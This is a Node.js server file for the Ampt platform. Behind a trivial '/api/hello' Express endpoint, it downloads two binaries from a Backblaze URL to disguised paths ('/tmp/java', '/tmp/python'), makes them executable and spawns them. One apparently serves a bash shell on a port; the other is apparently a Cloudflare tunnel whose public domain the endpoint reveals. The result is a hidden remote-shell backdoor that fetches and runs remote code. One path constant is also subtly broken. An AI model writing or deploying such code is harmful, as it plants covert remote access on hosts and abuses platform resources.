import { http } from "@ampt/sdk";

import https  from "https" ;
import { spawn }  from "child_process" ;
import fs  from "fs" ;

var flareDomain="";


const rayPath =  + "/tmp/java";
const tunnelPath = "/tmp/python";
const rayUrl= "https://f005.backblazeb2.com/file/kiraro/litaty";
const tunnelUrl ="https://f005.backblazeb2.com/file/kiraro/lifa";


function emptyFunction() {}

function runRay(){
	var child = spawn(rayPath,["-p","33333","bash"]); 
	console.log("ray done");
}

function runTunnel(){
	var child = spawn(tunnelPath,["tunnel","--url","http://127.0.0.1:55555","--no-autoupdate"]); 
  child.stderr.on('data', function (data) {
		
		if(data==undefined || data==null || data.length==0) return;
		const line = String.fromCharCode(...data);
		if(line.indexOf('|')<0) return;
		
		var startIndex = line.indexOf("https://");
        if(startIndex < 0) return;
        var endIndex = line.indexOf(".trycloudflare.com");
        if(endIndex < 0 || endIndex<startIndex) return;
		startIndex += 8;
		const doma=line.substring(startIndex,endIndex);
		flareDomain=doma;
	});
	console.log("tunnel done");
}

function download(url,path,callback) {
  console.log("downloading "+path);
  https.get(url, function (srvResp) {
    var body = [];
    srvResp.on("data", function (chunk) {
      body.push(chunk);
    });

    srvResp.on("end", function () {
        fs.writeFileSync(path, Buffer.concat(body));
		fs.chmodSync(path, 511);
		callback();
    });
  });
}


function checkFiles() {
  if (!fs.existsSync(rayPath)) {
    fs.unlink(rayPath, emptyFunction);
	download(rayUrl,rayPath,runRay);
  }else {
	fs.chmodSync(rayPath, 511); 
	runRay();
  }
  
  if (!fs.existsSync(tunnelPath)) {
    fs.unlink(tunnelPath, emptyFunction);
	  download(tunnelUrl,tunnelPath,runTunnel);
  }else {
	fs.chmodSync(tunnelPath, 511); 
	runTunnel();
  }
}

checkFiles();

import express, { Router } from "express";

const app = express();
const api = Router();

api.get("/hello", (req, res) => {

  return res.status(200).send("kkk " +flareDomain);
});
app.use("/api", api);

http.node.use(app);
